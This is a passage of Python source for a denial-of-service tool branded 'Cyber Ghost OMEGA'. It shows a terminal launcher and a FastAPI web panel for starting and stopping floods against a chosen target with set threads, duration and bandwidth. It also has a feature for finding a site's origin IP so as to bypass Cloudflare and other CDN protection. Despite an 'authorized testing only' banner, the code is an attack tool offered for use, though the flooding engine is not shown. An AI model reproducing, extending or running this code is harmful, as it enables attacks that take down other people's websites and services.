    bw = safe_input(f"{C.YELLOW}>> BW Mbps (0=unlimited): {C.RESET}", "0")
    try: bw = max(0, int(bw))
    except: bw = 0
    find_origin = safe_input(f"{C.YELLOW}>> Try find origin IP behind CDN? (y/n): {C.RESET}", "n").lower() == "y"
    origin_ip = ""
    if find_origin:
        engine.target_host = target
        if "://" in target: engine.target_host = urllib.parse.urlparse(target).hostname or target
        origin_ip = engine.find_origin_ip()

    print(f"\n{C.RED}{C.BOLD}⚠️  Target: {target}:{port} | Method: {method} | Threads: {threads} | Duration: {duration}s{C.RESET}")
    if origin_ip: print(f"{C.GREEN}   Origin IP: {origin_ip}{C.RESET}")
    if safe_input(f"{C.YELLOW}>> Type 'I AGREE': {C.RESET}").strip().upper() != "I AGREE":
        print(f"{C.RED}Cancelled.{C.RESET}"); return

    cfg = AttackConfig(target=target, port=port, method=method, threads=threads,
                       duration=duration, bandwidth_limit=bw, origin_ip=origin_ip)
    print(f"\n{C.GREEN}{C.BOLD}🚀 Launching...{C.RESET}\n")
    try:
        engine.launch(cfg)
        while engine.running: time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}Stopping...{C.RESET}"); engine.stop()
    except Exception as e:
        print(f"{C.RED}Error: {e}{C.RESET}"); engine.stop()
    print(f"\n{C.GREEN}✔ Finished.{C.RESET}")

app = FastAPI(title="Cyber Ghost Omega")

def build_method_options():
    return "".join(f'<option value="{m}">{e} {m}</option>' for m, e in METHODS)

HTML = """<!DOCTYPE html><html><head><meta charset="UTF-8"><title>👻 Cyber Ghost OMEGA</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#00ffcc;font-family:'Courier New',monospace;min-height:100vh;display:flex;justify-content:center;padding:20px}
.c{background:rgba(0,20,20,.95);border:2px solid #00ffcc;border-radius:15px;padding:30px;max-width:850px;width:100%;box-shadow:0 0 60px rgba(0,255,204,.2)}
h1{font-size:2.8em;text-shadow:0 0 30px #00ffcc;text-align:center;margin-bottom:5px}
.sub{color:#88ffdd;opacity:.7;text-align:center;font-size:.9em;margin-bottom:10px}
.creator{text-align:center;color:#ff00ff;font-size:.9em;margin-bottom:15px;font-weight:bold}
.danger{color:#ff4444;animation:blink 1s infinite;font-weight:bold;margin:10px 0;text-align:center;font-size:.85em}
@keyframes blink{50%{opacity:.3}}
input,select{width:100%;padding:12px;margin:6px 0;background:#001818;border:1px solid #00ffcc66;color:#00ffcc;border-radius:8px;font-size:15px;font-family:inherit}
input:focus,select:focus{outline:none;border-color:#00ffcc;box-shadow:0 0 20px rgba(0,255,204,.2)}
.flex-row{display:flex;gap:10px}.flex-row>*{flex:1}
.btn-group{display:flex;gap:10px;margin:15px 0}
button{flex:1;padding:14px;border:none;border-radius:8px;font-weight:bold;font-size:16px;cursor:pointer;font-family:inherit;transition:.3s}
.btn-start{background:#00cc88;color:#000}.btn-start:hover{background:#00ffaa;box-shadow:0 0 40px rgba(0,255,170,.4)}
.btn-stop{background:#cc4400;color:#fff}.btn-stop:hover{background:#ff5500;box-shadow:0 0 40px rgba(255,85,0,.4)}
.btn-origin{background:#cc00cc;color:#fff;margin-bottom:10px}.btn-origin:hover{background:#ff00ff}
.stats-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin:20px 0}
.stat{background:#001010;padding:12px;border-radius:8px;border-left:3px solid #00ffcc}
.stat-label{font-size:.7em;color:#88ffdd;text-transform:uppercase}
.stat-value{font-size:1.5em;font-weight:bold;margin-top:4px}
.status{font-size:1.2em;margin:15px 0;padding:10px;border-radius:8px;background:#001010;text-align:center}
select{max-height:400px}
</style></head><body><div class="c">
<h1>👻 CYBER GHOST OMEGA</h1>
<div class="sub">⚡ World's Most Advanced Stress Tester v8.0 — 250+ Methods ⚡</div>
<div class="creator">🧠 Creator: Cyber Ghost &nbsp;|&nbsp; 📱 @Cyber_Ghost_error_404 &nbsp;|&nbsp; 📢 @Cyber_Ghost_error_404</div>
<div class="danger">⚠️ FOR AUTHORIZED TESTING ONLY — استفاده بدون مجوز پیگرد قانونی دارد ⚠️</div>
<input id="target" value="http://127.0.0.1" placeholder="Target URL or IP">
<div class="flex-row">
<input id="port" value="80" placeholder="Port">
<select id="method">__METHODS__</select>
</div>
<div class="flex-row">
<input id="threads" value="1000" placeholder="Threads">
<input id="duration" value="180" placeholder="Duration (sec)">
<input id="bw" value="0" placeholder="BW Mbps (0=unlimited)">
</div>
<button class="btn-origin" id="originBtn">🔍 FIND ORIGIN IP (Bypass CDN)</button>
<input id="origin" placeholder="Origin IP (optional — bypasses Cloudflare)" style="display:none">
<div class="btn-group">
<button class="btn-start" id="startBtn">🚀 LAUNCH</button>
<button class="btn-stop" id="stopBtn">⛔ STOP</button>
</div>
<div class="status" id="status">🟢 IDLE</div>
<div class="stats-grid">
<div class="stat"><div class="stat-label">📦 Packets</div><div class="stat-value" id="packets">0</div></div>
<div class="stat"><div class="stat-label">⚡ Rate</div><div class="stat-value" id="rate">0</div></div>
<div class="stat"><div class="stat-label">📶 Bandwidth</div><div class="stat-value" id="bandwidth">0</div></div>
<div class="stat"><div class="stat-label">❌ Failed</div><div class="stat-value" id="failed">0</div></div>
<div class="stat"><div class="stat-label">⏱️ Elapsed</div><div class="stat-value" id="elapsed">0s</div></div>
<div class="stat"><div class="stat-label">🔒 Limit</div><div class="stat-value" id="limit">0</div></div>
<div class="stat"><div class="stat-label">💻 CPU</div><div class="stat-value" id="cpu">0%</div></div>
<div class="stat"><div class="stat-label">🧠 RAM</div><div class="stat-value" id="ram">0%</div></div>
<div class="stat"><div class="stat-label">🧵 Threads</div><div class="stat-value" id="procThreads">0</div></div>
</div></div>
<script>
document.getElementById('originBtn').onclick = async ()=>{
  const t = document.getElementById('target').value;
  alert('🔍 Searching origin IP for: '+t+'\\nThis will take ~5 seconds');
  const r = await fetch('/api/find-origin',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target:t})});
  const j = await r.json();
  if(j.origin_ip){
    document.getElementById('origin').value = j.origin_ip;
    document.getElementById('origin').style.display = 'block';
    alert('✅ Origin IP found: '+j.origin_ip+'\\nSet as attack target!');
  } else {
    alert('❌ No origin IP found — CDN is properly configured');
  }
};
document.getElementById('startBtn').onclick = async ()=>{
  const cfg = {target: document.getElementById('target').value,
    port: parseInt(document.getElementById('port').value)||80,
    method: document.getElementById('method').value,
    threads: parseInt(document.getElementById('threads').value)||1000,
    duration: parseInt(document.getElementById('duration').value)||180,
    bandwidth_limit: parseInt(document.getElementById('bw').value)||0,
    use_proxy:false, lang:'en',
    origin_ip: document.getElementById('origin').value || ''};
  const r = await fetch('/api/attack/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(cfg)});
  if(r.ok) alert('🚀 LAUNCHED'); else{const e=await r.json(); alert('Error: '+(e.detail||'unknown'));}
};
document.getElementById('stopBtn').onclick = async ()=>{await fetch('/api/attack/stop',{method:'POST'});alert('⛔ Stopped');};
const wsP = location.protocol==='https:'?'wss://':'ws://';
const ws = new WebSocket(wsP + location.host + '/ws/stats');
ws.onmessage = e=>{
  const d = JSON.parse(e.data);
  if(d.type==='stats'){const s=d.data;
    document.getElementById('packets').textContent=(s.packets_sent||0).toLocaleString();
    document.getElementById('rate').textContent=Math.round(s.rate||0);
    document.getElementById('bandwidth').textContent=(s.bandwidth||0).toFixed(1)+' Mbps';
    document.getElementById('failed').textContent=(s.failed||0).toLocaleString();
    document.getElementById('elapsed').textContent=Math.round(s.elapsed||0)+'s';
    document.getElementById('limit').textContent=(s.bandwidth_limit||0)+' Mbps';
    document.getElementById('cpu').textContent=(s.cpu_percent||0).toFixed(0)+'%';
    document.getElementById('ram').textContent=(s.ram_percent||0).toFixed(0)+'%';
    document.getElementById('procThreads').textContent=s.process_threads||0;
    document.getElementById('status').innerHTML='🔴 ATTACKING (Origin: '+(s.origin_ip||'?')+')';document.getElementById('status').style.color='#ff4444';
  }else{document.getElementById('status').innerHTML='🟢 IDLE';document.getElementById('status').style.color='#00ff88';}
};
</script></body></html>"""
HTML = HTML.replace("__METHODS__", build_method_options())


@app.get("/", response_class=HTMLResponse)
async def index(): return HTMLResponse(HTML)

@app.post("/api/attack/start")
async def start_attack(config: AttackConfig, background_tasks: BackgroundTasks):
    if engine.running: raise HTTPException(status_code=400, detail="Already running")
    background_tasks.add_task(engine.launch, config)
    return {"message": "started"}

@app.post("/api/attack/stop")
async def stop_attack(): engine.stop(); return {"message": "stopped"}

@app.post("/api/find-origin")
async def find_origin(data: dict):
    target = data.get("target", "").strip()
    if "://" in target: target = urllib.parse.urlparse(target).hostname or target
    if not target: raise HTTPException(400, "no target")
    old_host = engine.target_host
    engine.target_host = target
    try:
        ip = engine.find_origin_ip()
        engine.target_host = old_host
        return {"origin_ip": ip if ip else ""}
    except Exception as e:
        engine.target_host = old_host
        return {"origin_ip": ""}

@app.get("/api/attack/status")
async def attack_status():
    if engine.running: return engine.status()
    return {"running": False}

@app.websocket("/ws/stats")
async def websocket_stats(ws: WebSocket):
    await ws.accept()
    try:
        while True:
            if engine.running:
                await ws.send_json({"type": "stats", "data": engine.status()})
            else:
                await ws.send_json({"type": "idle"})
            await asyncio.sleep(0.5)
    except WebSocketDisconnect: pass
    except Exception: pass

def run_web_mode():
    print(f"{C.GREEN}{C.BOLD}═══ WEB PANEL MODE ═══{C.RESET}\n")
    print(f"{C.CYAN}🌐 Panel: http://127.0.0.1:8000  (or http://<your-ip>:8000){C.RESET}")
    print(f"{C.CYAN}🛑 Press Ctrl+C to stop{C.RESET}\n")
    uvicorn.run(app, host="0.0.0.0", port=8000, log_level="warning")

def main():
    print_banner()
    ack = safe_input(f"{C.RED}>> Type 'I AGREE' to accept: {C.RESET}")
    if ack.strip().upper() != "I AGREE":
        print(f"{C.RED}Exiting.{C.RESET}"); sys.exit(0)
    mode = print_mode_menu()
    if mode == "1": run_terminal_mode()
    else: run_web_mode()

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n{C.YELLOW}Interrupted.{C.RESET}")
    except Exception as e: print(f"{C.RED}Fatal: {e}{C.RESET}"); sys.exit(1)
